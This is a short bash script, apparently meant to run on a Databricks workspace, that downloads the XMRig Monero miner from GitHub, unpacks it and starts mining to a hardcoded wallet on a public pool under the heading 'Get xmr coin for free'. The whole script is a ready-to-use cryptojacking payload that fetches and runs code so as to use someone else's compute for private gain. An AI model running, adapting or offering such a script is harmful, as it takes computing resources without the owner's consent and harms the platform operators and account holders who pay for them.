#! /bin/bash
# Get xmr coin for free
# Databricks

sudo apt update
Clear

 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-bionic-x64.tar.gz
tar xvzf xmrig-6.17.0-bionic-x64.tar.gz
cd xmrig-6.17.0
#./xmrig -o us-west.minexmr.com:443 -u 48tDH9mg5oDM6J6nLYyQYEBmy1ZCbPbLiF8rgWyssEVZ1CBcj9XqU4nSTsS3tpBTRq5WK28wEJqJ5SGmVFv2SvaN9X2ZDti -k --tls --rig-id Main
#chmod u+r+x xmrig
./xmrig -o us-west.minexmr.com:443 -u 48tDH9mg5oDM6J6nLYyQYEBmy1ZCbPbLiF8rgWyssEVZ1CBcj9XqU4nSTsS3tpBTRq5WK28wEJqJ5SGmVFv2SvaN9X2ZDti -k --tls --rig-id N1
#./xmrig
